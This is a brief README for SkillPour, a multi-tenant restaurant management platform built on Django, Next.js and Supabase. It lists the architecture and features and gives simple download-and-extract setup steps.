# SkillPour - F&B Management System

A comprehensive multi-tenant Food & Beverage management platform designed to streamline restaurant operations through modular, integrated solutions with enhanced error resilience and user experience.

## Project Overview

SkillPour is a modular, multi-tenant management system for food and beverage businesses. It allows multiple business tenants to operate independently within a single platform while providing specialized modules for various aspects of F&B operations.

## Architecture

- **Backend**: Django REST framework
- **Frontend**: Next.js with React and Tailwind CSS
- **Authentication**: Supabase + Django
- **Database**: PostgreSQL (primary) + Supabase (authentication/quick access)
- **Deployment**: Docker, Nginx, and SSL or Replit

## Getting Started

1. Download the project files from: https://ea3fd96a300e.repl.co/SkillPour-essentials.tar.gz
2. Extract the archive: `tar -xzf SkillPour-essentials.tar.gz`
3. Follow the deployment instructions in the documentation

## Features

- **Multi-tenancy**: Isolated environments for each business
- **Role-based access control**: Different permission levels
- **Modular design**: Activate only required modules
- **Real-time synchronization**: Between Django and Supabase
- **API proxy**: Unified API access for frontend
- **Responsive UI**: Mobile-friendly interface

